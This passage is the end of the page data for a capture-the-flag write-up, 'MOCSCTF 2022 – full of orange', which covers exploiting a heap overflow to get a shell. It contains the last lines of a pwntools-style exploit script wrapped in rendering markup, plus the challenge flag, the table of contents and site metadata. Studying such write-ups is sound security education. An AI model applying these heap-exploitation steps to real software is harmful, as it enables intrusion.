payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.h2,{id:\"4-get-flag\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#4-get-flag\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"4. Get flag\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/get_flag.png\",alt:\"get_flag.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Flag is \",(0,e.jsx)(n.code,{children:\"MOCSCTF{Fr33_@nd_Fr3E_1s_n07_3@5y}\"})]})]})}}var w=b;function _(a,c){throw new Error(\"Expected \"+(c?\"component\":\"object\")+\" `\"+a+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return y;})();\n;return Component;","toc":[{"value":"Full of Orange","url":"#full-of-orange","depth":2},{"value":"Reference source","url":"#reference-source","depth":3},{"value":"1. Find bug","url":"#1-find-bug","depth":2},{"value":"2. Brainstorming","url":"#2-brainstorming","depth":2},{"value":"Technique","url":"#technique","depth":3},{"value":"Brainstorming","url":"#brainstorming","depth":3},{"value":"3. Exploit","url":"#3-exploit","depth":2},{"value":"Stage 1: Leak main arena address","url":"#stage-1-leak-main-arena-address","depth":3},{"value":"Stage 2: Free 2 small chunks","url":"#stage-2-free-2-small-chunks","depth":3},{"value":"Stage 3: Get shell","url":"#stage-3-get-shell","depth":3},{"value":"4. Get flag","url":"#4-get-flag","depth":2}],"frontMatter":{"readingTime":{"text":"22 min read","minutes":21.87,"time":1312200,"words":4374},"slug":"mocsctf-2022/full-of-orange","fileName":"mocsctf-2022/full-of-orange.md","title":"MOCSCTF 2022 – full of orange","date":"2022-02-28T00:00:00.000Z","draft":false,"authors":["Johnathan"],"tags":["MOCSCTF 2022","pwn","heap","Shell","overflow","Binary Exploit"],"summary":"Heap overflow for shell.","canonical":"https://github.com/nhtri2003gmail/writeup-mocsctf2022.mocsctf.com-orange"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.2,"time":12000,"words":40},"slug":["Johnathan"],"fileName":"Johnathan.md","name":"Johnathan","avatar":"https://www.gravatar.com/avatar/aa9cc3f27f3b1f3c47841d62f18c039f?d=identicon&s=256","specialties":["Pwn"],"github":"https://github.com/nhtri2003gmail","member":true,"retired":true,"description":"A person who does magic things.","order":2,"date":null}],"prev":{"title":"DICE CTF 2022 – vm-calc","date":"2022-02-09T00:00:00.000Z","draft":false,"authors":["lemon"],"tags":["DICE CTF 2022","Web","Prototype Pollution","CVE-2022-21824","vm2","Proxy"],"summary":"Pollute prototype with a recent vulerability in console.table, and throw a proxy object within an exception.","slug":"dice-ctf-2022/vm-calc"},"next":{"title":"Ugra CTF Quals 2022 – Играет как умеет","date":"2022-03-01T00:00:00.000Z","draft":false,"authors":["blueset","sahuang"],"tags":["Ugra CTF Quals 2022","Misc","PDF","Music","Audio Processing","Talking Piano"],"summary":"Talking piano illusion only works if you know the words, but what if you only sort of know them?","slug":"ugra-ctf-quals-2022/symphony"}},"__N_SSG":true}